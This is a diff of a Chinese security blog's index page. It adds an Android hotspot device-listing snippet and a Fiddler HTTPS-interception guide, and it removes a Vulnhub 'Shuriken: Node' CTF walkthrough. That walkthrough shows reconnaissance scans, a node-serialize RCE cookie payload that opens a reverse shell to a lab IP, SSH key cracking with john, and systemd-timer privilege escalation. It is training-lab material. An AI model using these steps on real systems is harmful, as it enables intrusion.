@@ -86,6 +86,93 @@
 
     
         <h2 class="title">
+            <a href="/2023/09/02/Android-WIFI/">
+                Android 开启个人热点时 获取连接人数以及连接上的设备信息
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="android-开启个人热点时-获取连接人数以及连接上的设备信息">Android 开启个人热点时 获取连接人数以及连接上的设备信息</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/king4148/article/details/70156760">多看一二</a> 并作补充</p>
+</blockquote>
+<h2><span id="起因">起因</span></h2><blockquote>
+<p>最近在开发过程当中，遇到一个需求 ，开启个人热点后需要知道有多少人连上了这个热点 以及这些设备的信息</p>
+<p>经过一段时间的摸索和反复的查阅资料，有了下面的代码和解决办法：</p>
+<p>首先 连接热点的所有信息都保存在proc&#x2F;net&#x2F;arp下面 用re文件管理器可以查看一下</p>
+<p>会发现 里面有连接的设备的 ip mac地址 等等  </p>
+<p>好了 那么问题就简单了</p>
+<p>直接贴代码：</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">ArrayList&lt;ClientScanResult&gt; result = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    br = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;/proc/net/arp&quot;</span>));<span class="comment">//读取这个文件</span></span><br><span class="line">    String ss=br.toString();</span><br><span class="line">    String line;</span><br><span class="line">    <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">        String[] splitted = line.split(<span class="string">&quot; +&quot;</span>);<span class="comment">//将文件里面的字段分割开来</span></span><br><span class="line">        <span class="keyword">if</span> (splitted.length &gt;= <span class="number">4</span>) &#123;</span><br><span class="line">            <span class="comment">// Basic sanity check</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">mac</span> <span class="operator">=</span> splitted[<span class="number">3</span>];<span class="comment">// 文件中分别是IP address  HW type Flags HW address mask Device </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//然后我们拿取HW address  也就是手机的mac地址进行匹配  如果有 就证明是手机</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (mac.matches(<span class="string">&quot;..:..:..:..:..:..&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isReachable</span> <span class="operator">=</span> InetAddress.getByName(splitted[<span class="number">0</span>]).isReachable(reachableTimeout);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!onlyReachables || isReachable) &#123;</span><br><span class="line"></span><br><span class="line">                    result.add(<span class="keyword">new</span> <span class="title class_">ClientScanResult</span>(splitted[<span class="number">0</span>], splitted[<span class="number">3</span>], splitted[<span class="number">5</span>], isReachable));<span class="comment">//最后如果能匹配 那就证明是连接了热点的手机  加到这个集合里 里面有所有需要的信息</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    CandyLog.e(e.getMessage());</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="literal">null</span>) &#123;</span><br><span class="line">            br.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        CandyLog.e(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientScanResult</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String IpAddr;</span><br><span class="line">    <span class="keyword">private</span> String HWAddr;</span><br><span class="line">    <span class="keyword">private</span> String Device;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isReachable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientScanResult</span><span class="params">(String ipAddr, String hWAddr, String device, <span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.IpAddr = ipAddr;</span><br><span class="line">        <span class="built_in">this</span>.HWAddr = hWAddr;</span><br><span class="line">        <span class="built_in">this</span>.Device = device;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIpAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> IpAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIpAddr</span><span class="params">(String ipAddr)</span> &#123;</span><br><span class="line">        IpAddr = ipAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHWAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> HWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHWAddr</span><span class="params">(String hWAddr)</span> &#123;</span><br><span class="line">        HWAddr = hWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDevice</span><span class="params">(String device)</span> &#123;</span><br><span class="line">        Device = device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isReachable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReachable</span><span class="params">(<span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>好了 想要知道连接人数  只要得到集合的size就可以了  又解决一个问题</p>
+<p>关键点在于 热点信息储存在proc&#x2F;net&#x2F;arp 里面  有兴趣的可以了解下proc目录 里面有很多很多信息</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WIFI/" rel="tag">WIFI</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/09/02/Fiddler-HTTPS/">
+                Fiddler设置解密https的网络数据
+            </a>
+        </h2>
+    
+    <time>
+        Sep 2, 2023
+    </time>
+    <section class="content">
+        <h1><span id="fiddler设置解密https的网络数据">Fiddler设置解密https的网络数据</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38914978/article/details/104801629">Admirer_joker</a> 并作补充</p>
+</blockquote>
+<h2><span id="原理">原理</span></h2><blockquote>
+<p>Fiddler可以通过伪造CA证书来欺骗了浏览器和https服务器。大致原理就是在浏览器面前fiddler伪装成为一个https服务器，而在真正的https服务器面前fiddler又伪装成为浏览器，从而实现解密https数据包的目的；</p>
+</blockquote>
+<h2><span id="步骤">步骤</span></h2><blockquote>
+<p>解密https需要手动开启，步骤如下：</p>
+</blockquote>
+<h3><span id="1-tools-gt-fiddler-options-gt-https">1. Tools –&gt; Fiddler Options –&gt; HTTPS</span></h3><h3><span id="2-打开options-https后如图">2. 打开options-https后，如图：</span></h3><blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/1.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/2.png" alt="image"></p>
+</blockquote>
+<blockquote>
+<p><img src="/2023/09/02/Fiddler-HTTPS/3.png" alt="image"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Fiddler/" rel="tag">Fiddler</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2023/07/24/Hard-Coding/">
                 敏捷代码审计之代码硬编码
             </a>
@@ -769,8 +856,8 @@
 <h2><span id="杂记">杂记</span></h2><blockquote>
 <p>有生活常识的朋友都知道，当我们寄出一封信件的时候，如果收信人的地址变更或一些特殊原因。你所寄出的信件将会被原址退回。实际上电子邮件也是有这个退信功能的。不过这个便利的功能却被网络黑客发现并加以利用，邮件退信攻击有成为了危害邮件安全的一个难题。</p>
 <p>所谓邮件退信攻击，是将预攻击的对象伪造成发件人地址，而收件人设置为一系列其他邮件域并不存在的账号，这样当邮件大量发送，例如通过僵尸网络，由于收件人不存在，邮件系统将产生大量的退信给发件人地址。该发件人地址所属的真实服务器将收到大量的退信，增加服务器的负荷，也容易使该公司的邮件服务器被列入黑名单。</p>
-<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#98;&#x6f;&#98;&#x6f;&#64;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#x6d;">&#98;&#x6f;&#98;&#x6f;&#64;&#x61;&#x62;&#x63;&#x2e;&#x63;&#111;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#x6f;&#x62;&#111;&#64;&#97;&#98;&#x63;&#x2e;&#x63;&#111;&#109;">&#98;&#x6f;&#x62;&#111;&#64;&#97;&#98;&#x63;&#x2e;&#x63;&#111;&#109;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
-<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#77;&#x41;&#73;&#x4c;&#x45;&#x52;&#45;&#x44;&#x41;&#69;&#77;&#79;&#78;&#64;&#x78;&#x78;&#x78;&#x2e;&#99;&#111;&#x6d;">&#77;&#x41;&#73;&#x4c;&#x45;&#x52;&#45;&#x44;&#x41;&#69;&#77;&#79;&#78;&#64;&#x78;&#x78;&#x78;&#x2e;&#99;&#111;&#x6d;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
+<p>邮件退信攻击在程度上有所区别，上面介绍的这种攻击，被攻击者可能一天之内收到数百上千封各种退信。一般用户碰到的邮件退信攻击属于骚扰性质，垃圾邮件发送者在发送垃圾邮件时，常常随机的设置发件人，例如其中包括<a href="mailto:&#x62;&#x6f;&#98;&#111;&#64;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;">&#x62;&#x6f;&#98;&#111;&#64;&#97;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;</a>，当大量发送垃圾邮件时，有些邮件可能是以<a href="mailto:&#98;&#111;&#98;&#x6f;&#x40;&#x61;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;">&#98;&#111;&#98;&#x6f;&#x40;&#x61;&#98;&#99;&#46;&#x63;&#x6f;&#x6d;</a>发送的，则bobo就可能收到退信，有时一天只有几封或几十封，但总是不断，让人十分郁闷。</p>
+<p>退信信息通常比较有规律，例如发件人为空，或者为<a href="mailto:&#x4d;&#65;&#x49;&#76;&#69;&#82;&#x2d;&#x44;&#x41;&#69;&#x4d;&#x4f;&#x4e;&#x40;&#120;&#120;&#120;&#46;&#x63;&#111;&#x6d;">&#x4d;&#65;&#x49;&#76;&#69;&#82;&#x2d;&#x44;&#x41;&#69;&#x4d;&#x4f;&#x4e;&#x40;&#120;&#120;&#120;&#46;&#x63;&#111;&#x6d;</a>，主题一般为Undelivered Mail Returned等。有些用户采用关键字的技术将退信予以阻断，或者干脆限定阻止空发件人，但是这经常会把正常的退信也阻止掉，导致信息不畅。</p>
 <p>一般而言，退信占一个公司的邮件量5%以上，这其中绝大部分是垃圾退信。如何防止收到这种垃圾退信，避免邮件退信攻击呢?</p>
 <p>采用SPF或domain-key的技术。这两种技术的原理相似。例如sohu.com的SPF记录是sohu.com text &#x3D; “v&#x3D;spf1 ip4:61.135.130.0&#x2F;23 ip4:61.135.132.0&#x2F;23 (。。。sohu邮件服务器所属IP)all”;如果有人冒用sohu发送垃圾邮件，收件方如果采用了SPF过滤技术，就能判定这是假冒的垃圾邮件，将不会给sohu发送DNR了。</p>
 <p>遗憾的是很多服务器不做SPF验证，因此即使您的公司设置了SPF记录，也不能阻止垃圾退信。</p>
@@ -841,225 +928,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shuriken-Node/">
-                Shuriken Node
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shuriken-node">SHURIKEN: NODE</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shuriken-node">名称：Shuriken: Node</span></h4><h4><span id="发布日期20201213">发布日期：2020.12.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>serv-adm:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shuriken_nodeova">文件名：Shuriken_Node.ova</span></h4><h4><span id="文件大小25gb">文件大小：2.5GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken_nodeova">下载地址：</span></h4><h4><span id="md5-5eefc9733f218d3eb5e96ca231204bac">MD5: 5EEFC9733F218D3EB5E96CA231204BAC</span></h4><h4><span id="sha1-be48eb2ce8b9faa6c016bae4776869f873f6b2b9">SHA1: BE48EB2CE8B9FAA6C016BAE4776869F873F6B2B9</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shuriken_node和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shuriken-Node/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和8080端口，访问8080，查看源码没有什么线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.125 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，也没有过多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.125:8080 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="nodejs漏洞利用">Node.js漏洞利用</span></h3><blockquote>
-<p>1.根据主页提示，我们需要关注Node.js相关的问题，在exploit-db查询node.js相关的漏洞（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41289%EF%BC%89%EF%BC%9A">https://www.exploit-db.com/exploits/41289）：</a></p>
-<p><img src="/2022/08/24/Shuriken-Node/7.png" alt="image-"></p>
-<p>2.根据漏洞文档描述，我们在<a target="_blank" rel="noopener" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py%E4%B8%8B%E8%83%BD%E5%A4%9F%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9C%A8kali%E4%B8%8A%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%8B%EF%BC%9A">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py下能够找到利用程序，在kali上获取一下：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/8.png" alt="image-"></p>
-<p>3.利用nodejsshell.py生成设定的ip和端口的shellcode，根据漏洞文档描述，要将shellcode加载后进行base64编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python nodejsshell.py 192.168.56.102 9002</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/9.png" alt="image-"></p>
-<p>4.利用漏洞文档提供的加载器，再在<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/%E4%B8%8A%E8%BF%9B%E8%A1%8Cbase64%E8%BD%AC%E6%8D%A2%E5%90%8E%EF%BC%8Ckali%E7%9B%91%E5%90%AC%E5%AF%B9%E5%BA%94%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%8A%8Apayload%E6%B3%A8%E5%85%A5%E5%88%B0cookie%E4%B8%AD%EF%BC%9A">https://gchq.github.io/CyberChef/上进行base64转换后，kali监听对应端口，把payload注入到cookie中：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#125;()&quot;&#125;，加载器</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/10.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/11.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh免密登录初步提权">SSH免密登录，初步提权</span></h3><blockquote>
-<p>1.注入cookie后，我们就获得了shell，利用python构建交互式shell：</p>
-<p><img src="/2022/08/24/Shuriken-Node/13.png" alt="image-"></p>
-<p>2.查看文件权限，发现&#x2F;var&#x2F;backups目录下有ssh-backup.zip文件，解压后得到一个id_rsa：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la /var/backups</span><br><span class="line">unzip ssh-backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/14.png" alt="image-"></p>
-<p>3.我们在&#x2F;home目录下能够再发现serv-adm用户，这个密钥很可能就是该用户的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/15.png" alt="image-"></p>
-<p>4.id_rsa是一个加密了的密钥，我们把它复制到kali，利用ssh2john进行解密后ssh登录serv-adm：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim id_rsa.enc</span><br><span class="line">/usr/share/john/ssh2john.py id_rsa.enc &gt; id_rsa.hash</span><br><span class="line">john --wordlist=rockyou.txt id_rsa.hash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in id_rsa.enc -out id_rsa，pasword是刚才john解出的密码</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">ssh serv-adm@192.168.56.125 -i id_rsa</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/17.png" alt="image-"></p>
-</blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在ser-adm用户目录下，能够发现第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/18.png" alt="image-"></p>
-<p>2.利用sudo -l命令查看文件权限，发现有定时文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/19.png" alt="image-"></p>
-<p>3.我们查看一下shuriken-auto.timer，发现他定时执行shuriken-job.service，我们可以修改job为我们需要的提权程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/systemd/system</span><br><span class="line">ls -la</span><br><span class="line">cat shuriken-auto.timer</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/20.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano shuriken-job.service</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/21.png" alt="image-"></p>
-</blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们能重启一下时间器，获得用于提权的bashroot，执行触发获得root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop shuriken-auto.timer</span><br><span class="line">sudo systemctl start shuriken-auto.timer</span><br><span class="line">/tmp/bashroot -p</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/22.png" alt="image-"></p>
-<p>2.在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/08/24/Shuriken-1/">
-                Shuriken 1
-            </a>
-        </h2>
-    
-    <time>
-        Aug 24, 2022
-    </time>
-    <section class="content">
-        <h1><span id="shuriken-1">SHURIKEN: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shuriken-1">名称：Shuriken: 1</span></h4><h4><span id="发布日期20201113">发布日期：2020.11.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>server-management:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shuriken-1ova">文件名：Shuriken-1.ova</span></h4><h4><span id="文件大小27gb">文件大小：2.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken-1ova">下载地址：</span></h4><h4><span id="md5-2db75b09a1dd917ffe1df20b4450d032">MD5: 2DB75B09A1DD917FFE1DF20B4450D032</span></h4><h4><span id="sha1-602f049006afe12632a1b6feb6e4860008c96d32">SHA1: 602F049006AFE12632A1B6FEB6E4860008C96D32</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
